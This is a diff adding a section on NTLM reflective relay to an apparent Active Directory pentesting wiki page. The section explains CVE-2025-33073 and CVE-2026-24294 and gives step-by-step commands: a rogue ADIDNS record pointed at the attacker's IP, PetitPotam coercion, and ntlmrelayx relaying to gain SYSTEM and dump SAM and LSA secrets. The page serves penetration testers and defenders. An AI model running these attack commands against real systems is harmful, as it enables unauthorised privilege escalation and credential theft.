@@ -1,6 +1,6 @@
 ---
 description: MITRE ATT&CK™ Sub-technique T1557.001
-authors: ShutdownRepo, mpgn
+authors: ShutdownRepo, mpgn, PvUL00, ethicxz
 category: ad
 ---
 
@@ -224,6 +224,95 @@ ntlmrelayx.py -t dcsync://$DC_HOST -auth-smb "$DOMAIN/$USER:$PASSWORD"
 :::
 
 
+### NTLM Reflective Relay
+
+Reflective relay consists of relaying an NTLM or Kerberos authentication back to the originating machine itself when triggered [from a coercion](../mitm-and-coerced-authentications/index.md). Synacktiv published a series of research articles demonstrating multiple such techniques, each bypassing the mitigations introduced to address the previous one.
+
+#### CVE-2025-33073
+
+CVE-2025-33073 ([patched June 2025](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)) was [independently reported to Microsoft by several researchers](https://msrc.microsoft.com/update-guide/acknowledgement/CVE-2025-33073) and abuses ADIDNS to trigger **local NTLM authentication reflection**. Synacktiv published [an in-depth analysis](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) of the vulnerability, which serves as the basis for this section. By registering a DNS record embedding [marshalled target information](https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html) (e.g. `HOST1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`), `lsasrv!LsapCheckMarshalledTargetInfo` strips the serialized suffix and leaves only the hostname, `HOST1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` becomes `HOST`. `msv1_0!SspIsTargetLocalhost` then recognizes the target as local, causing the client to include the workstation and domain names in the `NTLM_NEGOTIATE`. When the victim server receives this message with matching names, `msv1_0!SsprHandleNegotiateMessage` sets the `NTLMSSP_NEGOTIATE_LOCAL_CALL` flag in the `NTLM_CHALLENGE`. PetitPotam coerces `lsass.exe` (running as SYSTEM) into authenticating toward the attacker. Upon receiving the challenge with the local call flag, `lsass.exe` copies its SYSTEM access token into the server context. When the attacker relays the `NTLM_AUTHENTICATE` back to the victim, the server retrieves that token and impersonates it, granting `NT AUTHORITY\SYSTEM` over SMB. By default [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) will then [dump the SAM and the LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md) of the target host.
+
+> [!TIP]
+> Verify that the target does not enforce SMB signing beforehand: 
+>```bash
+>netexec smb "$RANGE" --gen-relay-list targets.txt
+>```
+>
+> If SMB signing is enforced, exploitation may still be possible by relaying over HTTP instead. For instance if [ADCS](../adcs/) is installed (relay to the Web Enrollment endpoint via [ESC8](../adcs/unsigned-endpoints#web-endpoint-esc8)).
+
+1. A rogue ADIDNS record is first registered, pointing to the attacker's IP. In this reflective relay, the coerced machine and the relay target are the same, so the NetBIOS name of **the victim machine** is used. This can be performed with [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) (Python):
+
+```bash
+# Create a rogue ADIDNS record pointing to the attacker's IP:
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action add -r "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" -d "$ATTACKER_IP"
+```
+
+2. An authentication coerce is then triggered (for example, with [PetitPotam](../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md)) from the target to the DNS record, relaying the authentication with [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python).
+
+```bash
+# In a first terminal, ntlmrelayx waiting for an authentication to relay
+ntlmrelayx.py -t smb://"$TARGET_FQDN" -smb2support --remove-sign-seal
+
+# Coerce the victim to authenticate toward the rogue hostname (e.g. with PetitPotam):
+petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "$TARGET_FQDN"
+```
+
+> [!NOTE]
+> The `--remove-sign-seal` flag is available in [Synacktiv's impacket fork](https://github.com/synacktiv/impacket). It drops the `NTLMSSP_NEGOTIATE_SEAL` flag from the NTLM negotiate and authenticate messages, which is required for this technique to succeed.
+
+> [!CAUTION]
+> Clean up the rogue DNS record after the test: 
+>```bash
+>dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action remove -r "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
+>```
+
+> [!NOTE]
+> A single DNS record can be registered to target **any** vulnerable machine: `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`. Once the serialized target info is stripped, only `localhost` remains, causing the loopback check in `msv1_0!SspIsTargetLocalhost` to succeed regardless of the target's hostname.
+
+> [!NOTE]
+> The patch was released on June 2025 Patch Tuesday. The list of affected versions and corresponding KBs is available on the [Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073).
+
+#### CVE-2026-24294 (SMB port multiplexing)
+
+CVE-2026-24294 ([patched March 2026](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-24294)) bypasses the CVE-2025-33073 patch by exploiting **SMB port multiplexing**, a feature introduced in Windows 11 24H2 and Server 2025. The `WNetAddConnection4W` API allows mounting an SMB share on an arbitrary TCP port via `net use \\host\share /tcpport:PORT`. The Windows SMB client reuses existing TCP connections for matching share paths regardless of the originating privilege level. A low-privileged user pre-establishes a TCP connection to the attacker's server on a custom port; when a coercion primitive forces `lsass.exe` to authenticate toward the same share path, it reuses that connection, causing the privileged NTLM blob to flow through the attacker-controlled socket and be relayed back to the target.
+
+> [!NOTE]
+> This technique targets **Windows Server 2025** by default. **Windows 11 24H2** enforces SMB signing by default, requiring an additional bypass.
+
+1. A share is mounted on a custom port by a low-privileged local user on the **target Windows machine**, establishing the TCP connection toward the attacker's server:
+
+```powershell
+net use \\$ATTACKER_IP\share /tcpport:$PORT
+```
+
+2. The relay infrastructure is then set up: a modified `smbserver.py` listens on the same custom port to extract the privileged NTLM blob, while `ntlmrelayx.py` relays it to the target:
+
+```bash
+# In a first terminal, smbserver.py listening on the custom port
+smbserver.py -port $PORT share .
+
+# In a second terminal, ntlmrelayx relaying to the target
+ntlmrelayx.py -t smb://"$TARGET_FQDN" -smb2support
+```
+
+3. An authentication coercion forces `lsass.exe` to authenticate toward the same share path (e.g. with [PetitPotam](../mitm-and-coerced-authentications/rpc-coercions/ms-efsr.md)):
+
+```bash
+petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "$ATTACKER_IP" "$TARGET_FQDN"
+```
+
+> [!NOTE]
+> The patch was released on March 2026 Patch Tuesday. The list of affected versions and corresponding KBs is available on the [Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-24294).
+
+> [!WARNING]
+> The modified `smbserver.py` and `PetitPotam.exe` required to reproduce this technique had **not been released publicly** at the time of writing *(June 2026)*. The steps above reflect the described attack flow but cannot be fully executed without those tools. Follow [Synacktiv's impacket fork](https://github.com/synacktiv/impacket) and their [publications](https://www.synacktiv.com/publications) to stay informed about any future release, and feel free to contribute by opening a PR in their repository.
+
+> [!TIP]
+> The bypass chain extends to **Kerberos** with CVE-2025-58726 / CVE-2026-26128, which exploits Unicode character normalization inconsistencies to achieve the same reflective relay outcome via Kerberos AP-REQ. See the [Kerberos relay](../kerberos/relay.md) page.
+
+---
+
+
 ### Tips & tricks :bulb:
 
 The ntlmrelayx tool offers features making it a very valuable asset when pentesting an Active Directory domain:
@@ -279,3 +368,11 @@ The ntlmrelayx tool offers features making it a very valuable asset when pentest
 [http://davenport.sourceforge.net/ntlm.html](http://davenport.sourceforge.net/ntlm.html)
 
 [https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022](https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022)
+
+[https://msrc.microsoft.com/update-guide/acknowledgement/CVE-2025-33073](https://msrc.microsoft.com/update-guide/acknowledgement/CVE-2025-33073)
+
+[https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
+
+[https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part-1](https://www.synacktiv.com/publications/bypassing-windows-authentication-reflection-mitigations-for-system-shells-part-1)
+
+[https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html](https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html)
